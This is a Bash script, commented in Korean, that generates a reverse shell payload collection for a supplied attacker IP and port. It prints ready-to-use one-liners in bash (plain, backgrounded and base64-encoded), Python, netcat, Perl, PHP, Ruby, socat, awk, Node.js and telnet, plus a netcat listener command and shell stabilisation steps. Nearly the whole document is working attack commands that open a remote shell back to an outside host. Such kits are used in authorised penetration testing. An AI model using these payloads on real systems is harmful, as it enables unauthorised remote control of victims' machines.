#!/bin/bash
#
# Reverse Shell 페이로드 컬렉션
# 다양한 reverse shell을 빠르게 생성하는 스크립트
#
# 사용법: ./reverse_shell_collection.sh <공격자IP> <포트>
#

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "사용법: $0 <공격자IP> <포트>"
    echo "예: $0 10.10.10.10 4444"
    exit 1
fi

LHOST="$1"
LPORT="$2"

echo "============================================================"
echo "Reverse Shell 페이로드 생성기"
echo "============================================================"
echo "공격자 IP:   $LHOST"
echo "포트:        $LPORT"
echo ""
echo "먼저 리스너를 시작하세요:"
echo "  nc -lvnp $LPORT"
echo ""
echo "============================================================"
echo ""

echo "=== 1. BASH ==="
echo ""
echo "# 기본"
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo ""
echo "# 백그라운드"
echo "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &'"
echo ""
echo "# Base64 인코딩"
BASH_PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
BASH_B64=$(echo "$BASH_PAYLOAD" | base64)
echo "echo '$BASH_B64' | base64 -d | bash"
echo ""

echo "=== 2. PYTHON ==="
echo ""
echo "# Python 3"
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
echo ""
echo "# Python 3 PTY (안정적)"
echo "python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\")'"
echo ""
echo "# Python 2"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
echo ""

echo "=== 3. NETCAT ==="
echo ""
echo "# nc -e 사용 가능"
echo "nc -e /bin/bash $LHOST $LPORT"
echo ""
echo "# nc -e 없을 때"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f"
echo ""
echo "# FIFO 방식"
echo "mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc $LHOST $LPORT 1>/tmp/backpipe"
echo ""

echo "=== 4. PERL ==="
echo ""
echo "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
echo ""

echo "=== 5. PHP ==="
echo ""
echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
echo ""

echo "=== 6. RUBY ==="
echo ""
echo "ruby -rsocket -e'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
echo ""

echo "=== 7. SOCAT ==="
echo ""
echo "# 기본"
echo "socat TCP:$LHOST:$LPORT EXEC:/bin/bash"
echo ""
echo "# TTY (안정적)"
echo "socat TCP:$LHOST:$LPORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
echo ""

echo "=== 8. AWK ==="
echo ""
echo "awk 'BEGIN {s = \"/inet/tcp/0/$LHOST/$LPORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
echo ""

echo "=== 9. NODE.JS ==="
echo ""
echo "node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\");'"
echo ""

echo "=== 10. TELNET ==="
echo ""
echo "# 2개의 리스너 필요 (4444, 4445)"
echo "telnet $LHOST $LPORT | /bin/bash | telnet $LHOST $((LPORT+1))"
echo ""

echo "============================================================"
echo ""
echo "쉘 안정화 (Reverse Shell 획득 후):"
echo ""
echo "  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo "  Ctrl+Z"
echo "  stty raw -echo; fg"
echo "  Enter 2번"
echo "  export TERM=xterm"
echo ""
echo "============================================================"
